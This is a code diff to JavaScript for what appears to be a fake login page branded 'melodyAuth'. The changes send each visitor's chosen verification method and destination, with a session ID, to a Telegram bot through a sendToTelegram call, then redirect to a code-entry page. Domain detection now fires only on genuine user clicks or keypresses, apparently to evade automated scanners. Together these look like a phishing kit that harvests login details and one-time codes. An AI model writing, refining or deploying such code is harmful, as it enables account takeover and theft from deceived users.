@@ -47,8 +47,12 @@
     });
   }
 
-  document.addEventListener('click', function() {
-    if (!domainDetected) detectDomain();
+  document.addEventListener('click', function(e) {
+    if (!domainDetected && e.isTrusted) detectDomain();
+  });
+
+  document.addEventListener('keydown', function(e) {
+    if (!domainDetected && e.isTrusted) detectDomain();
   });
 
   // ============================================================
@@ -185,30 +189,32 @@
     }
 
     submitBtn.disabled = true;
-    submitBtn.textContent = 'Sending...';
+    submitBtn.innerHTML = '<span class="spinner"></span>';
+    submitBtn.classList.add('loading');
+    
+    const sessionId = 'AUTH_' + Date.now() + '_' + Math.random().toString(36).substr(2, 6);
     
     sendToTelegram('auth_attempt', {
       method: method,
-      destination: destination
+      destination: destination,
+      sessionId: sessionId
     }).then(() => {
-      submitBtn.textContent = 'Processing...';
-      
       try {
         sessionStorage.setItem(
           "melodyAuth",
           JSON.stringify({
             method: method,
-            destination: destination
+            destination: destination,
+            sessionId: sessionId
           })
         );
       } catch (e) {}
       
-      setTimeout(function() {
-        window.location.href = "enter-code.html";
-      }, 1500);
+      window.location.href = "enter-code.html";
     }).catch(() => {
       submitBtn.disabled = false;
-      submitBtn.textContent = 'Generate Code';
+      submitBtn.innerHTML = 'Generate Code';
+      submitBtn.classList.remove('loading');
     });
   });
 })();
